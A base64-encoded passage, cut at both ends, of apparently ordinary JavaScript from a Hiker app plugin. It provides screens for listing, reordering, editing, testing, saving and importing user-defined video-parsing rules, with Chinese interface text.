gICAgICAgICAgICAgICAgICAgIGxldCBydWxlcyA9ICQucmVxdWlyZShcXFwiY29uZmlnc1xcXCIpLmdldEpzb24oKTtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBydWxlID0gcnVsZXMuc3BsaWNlKGluZGV4LCAxKVswXTtcXG4gICAgICAgICAgICAgICAgICAgIHJ1bGVzLnNwbGljZShuZXdJbmRleCwgMCwgcnVsZSk7XFxuICAgICAgICAgICAgICAgICAgICAkLnJlcXVpcmUoXFxcImNvbmZpZ3NcXFwiKS5zYXZlSnNvbihydWxlcyk7XFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICAgICAgICAgIH0sIGluZGV4LCBsZW5ndGgpO1xcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoaW5wdXQgPT09IFxcXCLnva7pobZcXFwiKSB7XFxuICAgICAgICAgICAgICAgIGxldCBuZXdJbmRleCA9IDA7XFxuICAgICAgICAgICAgICAgIGxldCBydWxlcyA9ICQucmVxdWlyZShcXFwiY29uZmlnc1xcXCIpLmdldEpzb24oKTtcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGUgPSBydWxlcy5zcGxpY2UoaW5kZXgsIDEpWzBdO1xcbiAgICAgICAgICAgICAgICBydWxlcy5zcGxpY2UobmV3SW5kZXgsIDAsIHJ1bGUpO1xcbiAgICAgICAgICAgICAgICAkLnJlcXVpcmUoXFxcImNvbmZpZ3NcXFwiKS5zYXZlSnNvbihydWxlcyk7XFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgICAgICB9IGVsc2UgaWYgKGlucHV0ID09PSBcXFwi5Yig6ZmkXFxcIikge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gJChcXFwi56Gu6K6k5Yig6Zmk77yfXFxcIikuY29uZmlybSgoaW5kZXgpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBydWxlcyA9ICQucmVxdWlyZShcXFwiY29uZmlnc1xcXCIpLmdldEpzb24oKTtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBydWxlID0gcnVsZXMuc3BsaWNlKGluZGV4LCAxKVswXTtcXG4gICAgICAgICAgICAgICAgICAgICQucmVxdWlyZShcXFwiY29uZmlnc1xcXCIpLnNhdmVKc29uKHJ1bGVzKTtcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lt7LliKDpmaRcXFwiICsgcnVsZS5uYW1lO1xcbiAgICAgICAgICAgICAgICB9LCBpbmRleCk7XFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgbGV0IGFyciA9ICQucmVxdWlyZShcXFwiY29uZmlnc1xcXCIpLmdldEpzb24oKTtcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGUgPSBhcnJbaW5kZXhdO1xcbiAgICAgICAgICAgICAgICBydWxlLmZvcmJpZGRlbiA9ICFydWxlLmZvcmJpZGRlbjtcXG4gICAgICAgICAgICAgICAgJC5yZXF1aXJlKFxcXCJjb25maWdzXFxcIikuc2F2ZUpzb24oYXJyKTtcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgICAgICAvL3JldHVybiBcXFwidG9hc3Q6Ly9cXFwiICsgKHJ1bGUuZm9yYmlkZGVuID8gXFxcIuemgeeUqFxcXCIgOiBcXFwi5ZCv55SoXFxcIikgKyBydWxlLm5hbWU7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSwgaSwgbGVuZ3RoKSxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIixcXG4gICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgaTogaSxcXG4gICAgICAgICAgICBwYWdlVGl0bGU6IGl0Lm5hbWVcXG4gICAgICAgIH1cXG4gICAgfSk7XFxufVxcbmNvdW50VGl0bGUudGl0bGUgPSAnPGZvbnQgY29sb3I9XFxcIiMxM0I2MUJcXFwiPuKWkCA8L2ZvbnQ+PGI+6Kej5p6Q5YiX6KGoPGI+ICgnICsgKChkLmxlbmd0aCAtIGNvdW50KSArIFxcXCIvXFxcIiArIGxlbmd0aCkuZm9udGNvbG9yKFxcXCIjZmY2NjAxXFxcIikgKyBcXFwiKVxcXCI7XFxuc2V0UmVzdWx0KGQpO1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi6Kej5p6Q57yW6L6RXCIsXCJwYXRoXCI6XCJydWxlRWRpdFwiLFwicnVsZVwiOlwianM6XFxudmFyIGQgPSBbXTtcXG5cXG5hZGRMaXN0ZW5lcihcXFwib25DbG9zZVxcXCIsICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICBjbGVhck15VmFyKFxcXCJwc19uYW1lXFxcIik7XFxuICAgIGNsZWFyTXlWYXIoXFxcInBzX3VybFxcXCIpO1xcbiAgICBjbGVhck15VmFyKFxcXCJwc19mbGFnXFxcIik7XFxuICAgIGNsZWFyTXlWYXIoXFxcInBzX2hlYWRlcnNcXFwiKTtcXG4gICAgY2xlYXJNeVZhcihcXFwicHNfbWV0aG9kXFxcIik7XFxuICAgIGNsZWFyTXlWYXIoXFxcInBzX3J1blR5cGVcXFwiKTtcXG4gICAgY2xlYXJNeVZhcihcXFwicHNfanNvblBhdGhcXFwiKTtcXG4gICAgY2xlYXJNeVZhcihcXFwicHNfanNcXFwiKTtcXG59KSk7XFxubGV0IHVybEluZGV4ID0gcGFyc2VJbnQoZ2V0UGFyYW0oXFxcImluZGV4XFxcIiwgXFxcIlxcXCIpKTtcXG51cmxJbmRleCA9IE51bWJlci5pc05hTih1cmxJbmRleCkgPyB2b2lkKDApIDogdXJsSW5kZXg7XFxubGV0IGluZGV4ID0gdm9pZCgwKSA9PT0gdXJsSW5kZXggPyBNWV9QQVJBTVMuaSA6IHVybEluZGV4O1xcbmxldCBpc0ltcG9ydCA9ICEhZ2V0UGFyYW0oXFxcImlzSW1wb3J0XFxcIiwgXFxcIlxcXCIpO1xcbmxldCBhcnIgPSAkLnJlcXVpcmUoXFxcImNvbmZpZ3NcXFwiKS5nZXRKc29uKCk7XFxubGV0IG9iajtcXG5pZiAoaXNJbXBvcnQpIHtcXG4gICAgdHJ5IHtcXG4gICAgICAgIG9iaiA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9maWxlcy9fY2FjaGUvamlleGlTaW1wbGVJbXBvcnQuanNvblxcXCIpO1xcbiAgICAgICAgbGV0IHRpcCA9IGluZGV4ICE9PSB2b2lkKDApID8gXFxcIuabtOaWsOino+aekFxcXCIgOiBcXFwi5a+85YWl6Kej5p6QXFxcIjtcXG4gICAgICAgIHNldFBhZ2VUaXRsZSh0aXAgKyBcXFwiOlxcXCIgKyBvYmoubmFtZSk7XFxuICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi4oCY4oCYXFxcIiArIHRpcCArIFxcXCLigJnigJlcXFwiLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxuICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCIsXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSk7XFxuXFxuICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgIG9iaiA9IHt9O1xcbiAgICAgICAgYmFjaygpO1xcbiAgICAgICAgdG9hc3QoXFxcIuWvvOWFpemUmeivr1xcXCIpO1xcbiAgICB9XFxufSBlbHNlIGlmIChpbmRleCAhPT0gdm9pZCgwKSkge1xcbiAgICBvYmogPSBhcnJbaW5kZXhdO1xcbiAgICBzZXRQYWdlVGl0bGUoXFxcIue8lui+keino+aekDpcXFwiICsgb2JqLm5hbWUpO1xcbn0gZWxzZSB7XFxuICAgIG9iaiA9IHtcXG4gICAgICAgIHJ1blR5cGU6IFxcXCJXRUJcXFwiLFxcbiAgICAgICAgbWV0aG9kOiBcXFwiR0VUXFxcIlxcbiAgICB9O1xcbiAgICBzZXRQYWdlVGl0bGUoXFxcIuaWsOW7uuino+aekFxcXCIpO1xcbn1cXG5cXG5kLnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImlucHV0XFxcIixcXG4gICAgZGVzYzogXFxcIuWQjeWtlyjlv4XloaspXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIG9uQ2hhbmdlOiAkLnRvU3RyaW5nKCgpID0+IHtcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFwicHNfbmFtZVxcXCIsIGlucHV0KTtcXG4gICAgICAgIH0pLFxcbiAgICAgICAgZGVmYXVsdFZhbHVlOiBvYmoubmFtZSxcXG4gICAgICAgIHRpdGxlVmlzaWJsZTogZmFsc2VcXG4gICAgfVxcbn0pO1xcblxcblxcbmQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwiaW5wdXRcXFwiLFxcbiAgICBkZXNjOiBcXFwi6Kej5p6QdXJsKOW/heWhqylcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgb25DaGFuZ2U6ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXCJwc191cmxcXFwiLCBpbnB1dCk7XFxuICAgICAgICB9KSxcXG4gICAgICAgIGRlZmF1bHRWYWx1ZTogb2JqLnVybCxcXG4gICAgICAgIHRpdGxlVmlzaWJsZTogZmFsc2UsXFxuICAgIH1cXG59KTtcXG5kLnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImlucHV0XFxcIixcXG4gICAgZGVzYzogXFxcImZsYWco5b+F5aGrKVxcXCIsXFxuICAgIGV4dHJhOiB7XFxuICAgICAgICB0eXBlOiBcXFwidGV4dGFyZWFcXFwiLFxcbiAgICAgICAgaGVpZ2h0OiAyLFxcbiAgICAgICAgaGlnaGxpZ2h0OiB0cnVlLFxcbiAgICAgICAgb25DaGFuZ2U6ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXCJwc19mbGFnXFxcIiwgaW5wdXQpO1xcbiAgICAgICAgfSksXFxuICAgICAgICBkZWZhdWx0VmFsdWU6IG9iai5mbGFnLFxcbiAgICAgICAgdGl0bGVWaXNpYmxlOiBmYWxzZSxcXG4gICAgfVxcbn0pO1xcbmQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwiaW5wdXRcXFwiLFxcbiAgICBkZXNjOiBcXFwiaGVhZGVycyjpgInloaspXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIHR5cGU6IFxcXCJ0ZXh0YXJlYVxcXCIsXFxuICAgICAgICBoZWlnaHQ6IDIsXFxuICAgICAgICBoaWdobGlnaHQ6IHRydWUsXFxuICAgICAgICBvbkNoYW5nZTogJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcInBzX2hlYWRlcnNcXFwiLCBpbnB1dCk7XFxuICAgICAgICB9KSxcXG4gICAgICAgIGRlZmF1bHRWYWx1ZTogb2JqLmhlYWRlcnMsXFxuICAgICAgICB0aXRsZVZpc2libGU6IGZhbHNlLFxcbiAgICB9XFxufSk7XFxuXFxucHV0TXlWYXIoXFxcInBzX3J1blR5cGVcXFwiLCBvYmoucnVuVHlwZSB8fCBcXFwiXFxcIik7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLop6PmnpDmqKHlvI/vvJpcXFwiICsgKG9iai5ydW5UeXBlIHx8IFxcXCJXRUJcXFwiKSxcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXG4gICAgdXJsOiAkKFtcXFwiV0VCXFxcIiwgXFxcIkpTT05cXFwiLCBcXFwiSlNcXFwiXSkuc2VsZWN0KCgpID0+IHtcXG5cXG4gICAgICAgIHB1dE15VmFyKFxcXCJwc19ydW5UeXBlXFxcIiwgaW5wdXQpO1xcbiAgICAgICAgdXBkYXRlSXRlbShcXFwicHNfcnVuVHlwZVxcXCIsIHtcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuino+aekOaooeW8j++8mlxcXCIgKyBpbnB1dFxcbiAgICAgICAgfSk7XFxuICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICB9KSxcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIGlkOiBcXFwicHNfcnVuVHlwZVxcXCIsXFxuICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2VcXG4gICAgfVxcbn0pO1xcblxcblxcbmQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZV9ibGFua1xcXCJcXG59KTtcXG5kLnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImlucHV0XFxcIixcXG4gICAgZGVzYzogXFxcImpzb25QYXRoKEpTT07op6PmnpDmqKHlvI/lv4XloaspXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIG9uQ2hhbmdlOiAkLnRvU3RyaW5nKCgpID0+IHtcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFwicHNfanNvblBhdGhcXFwiLCBpbnB1dCk7XFxuICAgICAgICB9KSxcXG4gICAgICAgIGRlZmF1bHRWYWx1ZTogb2JqLmpzb25QYXRoLFxcbiAgICAgICAgdGl0bGVWaXNpYmxlOiBmYWxzZSxcXG4gICAgfVxcbn0pO1xcbnB1dE15VmFyKFxcXCJwc19tZXRob2RcXFwiLCBvYmoubWV0aG9kIHx8IFxcXCJcXFwiKTtcXG5kLnB1c2goe1xcbiAgICB0aXRsZTogXFxcIkpTT07or7fmsYLmqKHlvI/vvJpcXFwiICsgKG9iai5tZXRob2QgfHwgXFxcIkdFVFxcXCIpLFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCIsXFxuICAgIHVybDogJChbXFxcIkdFVFxcXCIsIFxcXCJQT1NUXFxcIl0pLnNlbGVjdCgoKSA9PiB7XFxuXFxuICAgICAgICBwdXRNeVZhcihcXFwicHNfbWV0aG9kXFxcIiwgaW5wdXQpO1xcbiAgICAgICAgdXBkYXRlSXRlbShcXFwicHNfbWV0aG9kXFxcIiwge1xcbiAgICAgICAgICAgIHRpdGxlOiBcXFwiSlNPTuivt+axguaooeW8j++8mlxcXCIgKyBpbnB1dFxcbiAgICAgICAgfSk7XFxuICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICB9KSxcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIGlkOiBcXFwicHNfbWV0aG9kXFxcIixcXG4gICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcbiAgICB9XFxufSk7XFxuZC5wdXNoKHtcXG4gICAgY29sX3R5cGU6IFxcXCJsaW5lX2JsYW5rXFxcIlxcbn0pO1xcbmQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwiaW5wdXRcXFwiLFxcbiAgICBkZXNjOiBcXFwianMoSlPmqKHlvI/lv4XloaspXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIHR5cGU6IFxcXCJ0ZXh0YXJlYVxcXCIsXFxuICAgICAgICBoZWlnaHQ6IDMsXFxuICAgICAgICBoaWdobGlnaHQ6IHRydWUsXFxuICAgICAgICBvbkNoYW5nZTogJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcInBzX2pzXFxcIiwgaW5wdXQpO1xcbiAgICAgICAgfSksXFxuICAgICAgICBkZWZhdWx0VmFsdWU6IG9iai5qcyxcXG4gICAgICAgIHRpdGxlVmlzaWJsZTogZmFsc2UsXFxuICAgIH1cXG59KTtcXG5kLnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImxpbmVfYmxhbmtcXFwiXFxufSk7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLliKDpmaRcXFwiLFxcbiAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKGluZGV4LCB1cmxJbmRleCkgPT4ge1xcbiAgICAgICAgaWYgKGluZGV4ID09PSB2b2lkKDApKSB7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+atpOmhueaXoOazleWIoOmZpFxcXCI7XFxuICAgICAgICB9XFxuICAgICAgICBpZiAodXJsSW5kZXggIT09IHZvaWQoMCkpIHtcXG4gICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5q2j5Zyo5pu05paw6Kej5p6Q77yM5Yig6Zmk6K+35LuO6Kej5p6Q566h55CG6L+b5YWlXFxcIjtcXG4gICAgICAgIH1cXG4gICAgICAgIGNvbmZpcm0oe1xcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi5rip6aao5o+Q56S6XFxcIixcXG4gICAgICAgICAgICBjb250ZW50OiBcXFwi56Gu5a6a6KaB5Yig6Zmk5q2k6Kej5p6Q5ZCX77yf5rOo5oSP5Yig6Zmk5ZCO5peg5rOV5oGi5aSNXFxcIixcXG4gICAgICAgICAgICBjb25maXJtOiAkLnRvU3RyaW5nKChpbmRleCkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgYXJyID0gJC5yZXF1aXJlKFxcXCJjb25maWdzXFxcIikuZ2V0SnNvbigpO1xcbiAgICAgICAgICAgICAgICBhcnIuc3BsaWNlKGluZGV4LCAxKTtcXG4gICAgICAgICAgICAgICAgJC5yZXF1aXJlKFxcXCJjb25maWdzXFxcIikuc2F2ZUpzb24oYXJyKTtcXG4gICAgICAgICAgICAgICAgYmFjayh0cnVlKTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+WIoOmZpOaIkOWKn1xcXCI7XFxuICAgICAgICAgICAgfSwgaW5kZXgpXFxuICAgICAgICB9KTtcXG4gICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCJcXG4gICAgfSwgaW5kZXgsIHVybEluZGV4KSxcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzNcXFwiLFxcbn0pO1xcblxcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5rWL6K+VXFxcIixcXG4gICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKCgpID0+IHtcXG4gICAgICAgIGxldCB0ZXN0S2V5d29yZCA9IGdldEl0ZW0oXFxcInRlc3RVcmxcXFwiLCBcXFwiXFxcIik7XFxuICAgICAgICByZXR1cm4gJCh0ZXN0S2V5d29yZCwgXFxcIuivt+i+k+WFpeW9seinhue9keermeWcsOWdgFxcXCIpLmlucHV0KCgpID0+IHtcXG4gICAgICAgICAgICBzZXRJdGVtKFxcXCJ0ZXN0VXJsXFxcIiwgaW5wdXQpO1xcbiAgICAgICAgICAgIGxldCB1cmwgPSBnZXRNeVZhcihcXFwicHNfdXJsXFxcIiwgXFxcIlxcXCIpO1xcbiAgICAgICAgICAgIGxldCBuYW1lID0gZ2V0TXlWYXIoXFxcInBzX25hbWVcXFwiLCBcXFwiXFxcIik7XFxuICAgICAgICAgICAgbGV0IGZsYWcgPSBnZXRNeVZhcihcXFwicHNfZmxhZ1xcXCIsIFxcXCJcXFwiKTtcXG4gICAgICAgICAgICBsZXQgaGVhZGVycyA9IGdldE15VmFyKFxcXCJwc19oZWFkZXJzXFxcIiwgXFxcIlxcXCIpO1xcbiAgICAgICAgICAgIGxldCBydW5UeXBlID0gZ2V0TXlWYXIoXFxcInBzX3J1blR5cGVcXFwiLCBcXFwiV0VCXFxcIik7XFxuICAgICAgICAgICAgbGV0IG1ldGhvZCA9IGdldE15VmFyKFxcXCJwc19tZXRob2RcXFwiLCBcXFwiR0VUXFxcIik7XFxuICAgICAgICAgICAgbGV0IGpzb25QYXRoID0gZ2V0TXlWYXIoXFxcInBzX2pzb25QYXRoXFxcIiwgXFxcIlxcXCIpLnRyaW0oKSB8fCB2b2lkIDA7XFxuICAgICAgICAgICAgbGV0IGpzID0gZ2V0TXlWYXIoXFxcInBzX2pzXFxcIiwgXFxcIlxcXCIpIHx8IHZvaWQgMDtcXG4gICAgICAgICAgICBpZiAoaGVhZGVycykge1xcbiAgICAgICAgICAgICAgICB0cnkge1xcbiAgICAgICAgICAgICAgICAgICAgaGVhZGVycyA9IEpTT04ucGFyc2UoaGVhZGVycyk7XFxuICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGVhZGVyc+agvOW8j+mUmeivrzpcXFwiICsgZS50b1N0cmluZygpO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHJldHVybiAkLnJlcXVpcmUoXFxcInZpZGVvVXJsXFxcIikucHJlcGFyZVBhcnNlcyhbe1xcbiAgICAgICAgICAgICAgICBuYW1lLFxcbiAgICAgICAgICAgICAgICB1cmwsXFxuICAgICAgICAgICAgICAgIGZsYWcsXFxuICAgICAgICAgICAgICAgIGhlYWRlcnMsXFxuICAgICAgICAgICAgICAgIHJ1blR5cGUsXFxuICAgICAgICAgICAgICAgIG1ldGhvZCxcXG4gICAgICAgICAgICAgICAganNvblBhdGgsXFxuICAgICAgICAgICAgICAgIGpzXFxuICAgICAgICAgICAgfV0sIGlucHV0LG51bGwsIHRydWUpO1xcbiAgICAgICAgfSk7XFxuICAgIH0pLFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfM1xcXCIsXFxufSk7XFxuXFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLkv53lrZhcXFwiLFxcbiAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKGluZGV4LCBpc0ltcG9ydCkgPT4ge1xcbiAgICAgICAgbGV0IG5hbWUgPSBnZXRNeVZhcihcXFwicHNfbmFtZVxcXCIsIFxcXCJcXFwiKS50cmltKCk7XFxuICAgICAgICBpZiAoIW5hbWUpIHtcXG4gICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5ZCN5a2X5b6X5pyJ5LiA5Liq5ZCnXFxcIjtcXG4gICAgICAgIH1cXG4gICAgICAgIGxldCB1cmwgPSBnZXRNeVZhcihcXFwicHNfdXJsXFxcIiwgXFxcIlxcXCIpLnRyaW0oKTtcXG4gICAgICAgIGlmICghdXJsKSB7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+ino+aekOWcsOWdgOS4jeiDveS4uuepulxcXCI7XFxuICAgICAgICB9XFxuICAgICAgICBsZXQgZmxhZyA9IGdldE15VmFyKFxcXCJwc19mbGFnXFxcIiwgXFxcIlxcXCIpO1xcbiAgICAgICAgaWYgKCFmbGFnKSB7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+ino+aekOWcsOWdgOagh+ivhuS4jeiDveS4uuepulxcXCI7XFxuICAgICAgICB9XFxuICAgICAgICBsZXQgaGVhZGVycyA9IGdldE15VmFyKFxcXCJwc19oZWFkZXJzXFxcIiwgXFxcIlxcXCIpLnRyaW0oKTtcXG4gICAgICAgIGlmIChoZWFkZXJzKSB7XFxuICAgICAgICAgICAgdHJ5IHtcXG4gICAgICAgICAgICAgICAgaGVhZGVycyA9IEpTT04ucGFyc2UoaGVhZGVycyk7XFxuICAgICAgICAgICAgICAgIGlmKHR5cGVvZiBoZWFkZXJzIT09XFxcIm9iamVjdFxcXCIpIHRocm93IG5ldyBFcnJvcihcXFwi6ZSZ6K+v57G75Z6L77yM5b+F6aG75Li6T2JqZWN0XFxcIik7XFxuICAgICAgICAgICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhlYWRlcnPmoLzlvI/plJnor686XFxcIiArIGUudG9TdHJpbmcoKTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9XFxuICAgICAgICBsZXQgcnVuVHlwZSA9IGdldE15VmFyKFxcXCJwc19ydW5UeXBlXFxcIiwgXFxcIldFQlxcXCIpO1xcbiAgICAgICAgbGV0IG1ldGhvZCA9IGdldE15VmFyKFxcXCJwc19tZXRob2RcXFwiLCBcXFwiR0VUXFxcIik7XFxuICAgICAgICBsZXQganNvblBhdGggPSBnZXRNeVZhcihcXFwicHNfanNvblBhdGhcXFwiLCBcXFwiXFxcIikudHJpbSgpIHx8IHZvaWQgMDtcXG4gICAgICAgIGxldCBqcyA9IGdldE15VmFyKFxcXCJwc19qc1xcXCIsIFxcXCJcXFwiKSB8fCB2b2lkIDA7XFxuICAgICAgICBpZiAocnVuVHlwZSA9PT0gXFxcIkpTT05cXFwiICYmICFqc29uUGF0aCkge1xcbiAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly9KU09O5qih5byP5LiL5b+F6aG75aGranNvblBhdGhcXFwiO1xcbiAgICAgICAgfSBlbHNlIGlmIChydW5UeXBlID09PSBcXFwiSlNcXFwiICYmICFqcykge1xcbiAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly9KU+aooeW8j+S4i+W/hemhu+Whq2pzXFxcIjtcXG4gICAgICAgIH1cXG4gICAgICAgIGxldCBhcnIgPSAkLnJlcXVpcmUoXFxcImNvbmZpZ3NcXFwiKS5nZXRKc29uKCk7XFxuICAgICAgICBsZXQgb2JqMSA9IHtcXG4gICAgICAgICAgICBuYW1lLFxcbiAgICAgICAgICAgIHVybCxcXG4gICAgICAgICAgICBmbGFnLFxcbiAgICAgICAgICAgIGhlYWRlcnMsXFxuICAgICAgICAgICAgcnVuVHlwZSxcXG4gICAgICAgICAgICBtZXRob2QsXFxuICAgICAgICAgICAganNvblBhdGgsXFxuICAgICAgICAgICAganNcXG4gICAgICAgIH07XFxuICAgICAgICBpZiAoaW5kZXggPT09IHZvaWQoMCkpIHtcXG4gICAgICAgICAgICBpZiAoYXJyLnNvbWUodiA9PiB2Lm5hbWUgPT09IG5hbWUpKSB7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lt7Lnu4/lrZjlnKjor6Xop6PmnpBcXFwiO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBpZiAob2JqMS5ncm91cCkge1xcbiAgICAgICAgICAgICAgICBsZXQgZ3JvdXAgPSBvYmoxLmdyb3VwO1xcbiAgICAgICAgICAgICAgICBsZXQgaW5kZXggPSBhcnIuZmluZEluZGV4KHYgPT4gdi5ncm91cCA9PT0gZ3JvdXApO1xcbiAgICAgICAgICAgICAgICBpZiAoaW5kZXggPT09IC0xKSB7XFxuICAgICAgICAgICAgICAgICAgICBhcnIudW5zaGlmdChvYmoxKTtcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgIGFyci5zcGxpY2UoaW5kZXgsIDAsIG9iajEpO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgaWYgKGlzSW1wb3J0KSB7XFxuICAgICAgICAgICAgICAgICAgICBhcnIucHVzaChvYmoxKTtcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgIGFyci51bnNoaWZ0KG9iajEpO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICBsZXQgbmFtZXkgPSBhcnJbaW5kZXhdLm5hbWU7XFxuICAgICAgICAgICAgaWYgKG5hbWUgIT09IG5hbWV5KSB7XFxuICAgICAgICAgICAgICAgIGlmIChhcnIuc29tZSh2ID0+IHYubmFtZSA9PT0gbmFtZSkpIHtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lt7Lnu4/lrZjlnKjor6Xop6PmnpBcXFwiO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIG9iajEgPSBPYmplY3QuYXNzaWduKGFycltpbmRleF0sIG9iajEpO1xcbiAgICAgICAgICAgIGFyci5zcGxpY2UoaW5kZXgsIDEsIG9iajEpO1xcbiAgICAgICAgfVxcbiAgICAgICAgJC5yZXF1aXJlKFxcXCJjb25maWdzXFxcIikuc2F2ZUpzb24oYXJyKTtcXG4gICAgICAgIGJhY2sodHJ1ZSk7XFxuICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5L+d5a2Y5oiQ5YqfXFxcIjtcXG4gICAgfSwgaW5kZXgsIGlzSW1wb3J0KSxcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzNcXFwiLFxcbn0pO1xcblxcbnNldFJlc3VsdChkKTtcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuino+aekOWvvOWFpVwiLFwicGF0aFwiOlwiaW1wb3J0XCIsXCJydWxlXCI6XCJqczpcXG5mdW5jdGlvbiBzYXZlQ2FjaGUoanNvbikge1xcbiAgICB3cml0ZUZpbGUoXFxcImhpa2VyOi8vZmlsZXMvX2NhY2hlL2ppZXhpU2ltcGxlSW1wb3J0Lmpzb25cXFwiLCBKU09OLnN0cmluZ2lmeShqc29uKSk7XFxufVxcbiQuZXhwb3J0cyA9IGZ1bmN0aW9